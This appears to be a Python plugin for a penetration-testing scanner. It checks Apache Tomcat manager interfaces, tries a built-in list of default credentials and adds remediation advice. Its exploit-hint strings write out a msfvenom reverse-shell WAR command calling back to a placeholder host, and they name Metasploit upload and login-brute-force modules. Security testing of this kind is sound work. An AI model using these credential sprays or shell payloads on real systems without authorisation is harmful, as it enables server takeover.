# plugins/tomcat_plugin.py
# =====================================================================
# File: plugins/tomcat_plugin.py
# Notes:
# - This file is part of the BlackPort project.
# - Tests Apache Tomcat manager interface for default credentials.
# - Metasploitable runs Tomcat on port 8180 with default tomcat:tomcat creds.
# - Manager access = WAR file deployment = remote code execution.
# - Use only on hosts/networks you own or have explicit permission to test.
# =====================================================================

from .plugin_base import PluginBase
import socket
import base64
import re


class TomcatPlugin(PluginBase):
    name = "Tomcat Manager Check"
    applicable_services = ["HTTP", "HTTP-alt", "Tomcat", "AJP"]

    TOMCAT_PORTS = {8080, 8180, 8443, 8009, 9090}

    # Default and common Tomcat credentials
    DEFAULT_CREDS = [
        ("tomcat",   "tomcat"),
        ("admin",    "admin"),
        ("admin",    ""),
        ("tomcat",   "s3cret"),
        ("admin",    "password"),
        ("manager",  "manager"),
        ("tomcat",   "password"),
        ("root",     "root"),
        ("both",     "tomcat"),
        ("role1",    "tomcat"),
    ]

    # Paths that indicate Tomcat
    TOMCAT_PATHS = ["/manager/html", "/manager/text", "/host-manager/html"]

    def run(self, target, port, banner=None):
        if port not in self.TOMCAT_PORTS:
            return None

        notes = []
        risk  = "LOW"
        exploit_hint = None

        # Quick banner check — Apache-Coyote is Tomcat's HTTP connector
        is_tomcat = False
        tomcat_version = None

        if banner:
            if "coyote" in banner.lower() or "tomcat" in banner.lower():
                is_tomcat = True
                match = re.search(r"Apache Tomcat[/ ]+([\d.]+)", banner, re.IGNORECASE)
                if match:
                    tomcat_version = match.group(1)
                notes.append(
                    f"Apache Tomcat detected on port {port}."
                    + (f" Version: {tomcat_version}" if tomcat_version else "")
                )

        # Probe for Tomcat manager
        result = self._probe_manager(target, port)

        if result["access"] == "manager_open":
            notes.append(
                f"CRITICAL: Tomcat Manager accessible at {result['path']} — "
                "WAR file deployment = remote code execution."
            )
            if result.get("creds"):
                user, pwd = result["creds"]
                notes.append(
                    f"Default credentials accepted: {user}:{pwd}"
                )
                risk = "CRITICAL"
                exploit_hint = (
                    f"Deploy malicious WAR: "
                    f"msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=4444 -f war > shell.war "
                    f"then upload via http://{target}:{port}{result['path']} "
                    f"OR Metasploit: use exploit/multi/http/tomcat_mgr_upload"
                )
            else:
                notes.append(
                    "Manager requires authentication — default credentials not accepted. "
                    "Try common passwords manually."
                )
                risk = "HIGH"
                exploit_hint = (
                    f"Brute force manager: use auxiliary/scanner/http/tomcat_mgr_login "
                    f"OR curl -u tomcat:tomcat http://{target}:{port}/manager/html"
                )

        elif result["access"] == "manager_exists":
            notes.append(
                f"Tomcat Manager found at {result['path']} — "
                "authentication required but manager is exposed."
            )
            risk = "HIGH"
            exploit_hint = (
                f"Metasploit: use auxiliary/scanner/http/tomcat_mgr_login "
                f"target: {target}:{port}"
            )

        elif result["access"] == "tomcat_detected":
            notes.append(
                "Tomcat web server detected. Manager interface not confirmed — "
                "may be restricted or on a different path."
            )
            risk = "MEDIUM"
            exploit_hint = (
                f"Check manually: curl -v http://{target}:{port}/manager/html"
            )
            is_tomcat = True

        elif not is_tomcat:
            return None  # Not Tomcat, skip

        # Version-based risk if no manager found
        if tomcat_version and risk == "LOW":
            major = int(tomcat_version.split(".")[0]) if tomcat_version else 99
            if major <= 6:
                notes.append(
                    f"Tomcat {tomcat_version} is end-of-life — multiple critical CVEs."
                )
                risk = "HIGH"
            elif major <= 7:
                notes.append(
                    f"Tomcat {tomcat_version} is end-of-life since 2021."
                )
                risk = "MEDIUM"

        notes.append(
            "Remediation: Restrict /manager to localhost only. "
            "Change default credentials. Disable manager if not needed."
        )

        if not notes:
            return None

        return {
            "plugin":       self.name,
            "risk":         risk,
            "notes":        " | ".join(notes),
            "exploit_hint": exploit_hint,
        }

    def _probe_manager(self, target, port, timeout=5):
        """
        Check if Tomcat manager interface is accessible and try default creds.
        Uses raw HTTP to avoid external dependencies.
        """
        result = {"access": None, "path": None, "creds": None}

        for path in self.TOMCAT_PATHS:
            # First check if path exists (no auth)
            resp = self._http_get(target, port, path, timeout=timeout)
            if not resp:
                continue

            status = self._parse_status(resp)

            if status == 200:
                result["access"] = "manager_open"
                result["path"]   = path
                return result

            elif status == 401:
                # Auth required — try default credentials
                result["access"] = "manager_exists"
                result["path"]   = path

                for user, pwd in self.DEFAULT_CREDS:
                    auth_resp = self._http_get(
                        target, port, path, timeout=timeout,
                        username=user, password=pwd
                    )
                    auth_status = self._parse_status(auth_resp) if auth_resp else None
                    if auth_status == 200:
                        result["access"] = "manager_open"
                        result["creds"]  = (user, pwd)
                        return result

                return result  # Manager found, no default creds worked

            elif status in (403, 404):
                continue

        # No manager found — check if it's Tomcat at all
        root_resp = self._http_get(target, port, "/", timeout=timeout)
        if root_resp:
            resp_str = root_resp.decode(errors="ignore").lower()
            if "tomcat" in resp_str or "coyote" in resp_str or "catalina" in resp_str:
                result["access"] = "tomcat_detected"
                result["path"]   = "/"

        return result

    def _http_get(self, target, port, path, timeout=5, username=None, password=None):
        """Send a raw HTTP GET request. Returns raw response bytes or None."""
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(timeout)
                s.connect((target, port))

                headers = [
                    f"GET {path} HTTP/1.0",
                    f"Host: {target}:{port}",
                    "User-Agent: Mozilla/5.0",
                    "Connection: close",
                ]

                if username is not None:
                    creds   = base64.b64encode(f"{username}:{password}".encode()).decode()
                    headers.append(f"Authorization: Basic {creds}")

                request = "\r\n".join(headers) + "\r\n\r\n"
                s.sendall(request.encode())

                resp = b""
                while True:
                    chunk = s.recv(4096)
                    if not chunk:
                        break
                    resp += chunk
                    if len(resp) > 65536:  # cap at 64KB
                        break

                return resp if resp else None

        except Exception:
            return None

    def _parse_status(self, resp):
        """Extract HTTP status code from raw response bytes."""
        if not resp:
            return None
        try:
            first_line = resp.split(b"\r\n")[0].decode(errors="ignore")
            parts = first_line.split(" ")
            if len(parts) >= 2:
                return int(parts[1])
        except Exception:
            pass
        return None
